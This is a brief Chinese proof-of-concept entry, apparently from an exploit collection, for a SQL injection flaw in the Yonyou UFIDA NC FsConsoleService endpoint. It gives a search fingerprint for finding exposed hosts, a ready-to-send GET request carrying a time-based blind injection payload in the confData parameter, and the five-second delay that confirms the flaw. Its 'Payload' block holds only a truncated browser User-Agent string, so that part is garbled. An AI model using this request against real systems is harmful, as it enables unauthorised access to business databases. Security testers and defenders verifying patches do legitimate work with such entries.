# 用友-UFIDA-NCuap.pub.fs.console.FsConsoleService存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`GET /servlet/~uapbs/uap.pub.fs.console.FsConsoleService?confData=guid%3d233%27;WAITFOR+DELAY+'0:0:5'--+&operType=filterLog HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
```
- **响应特征**：200 响应时间>=5s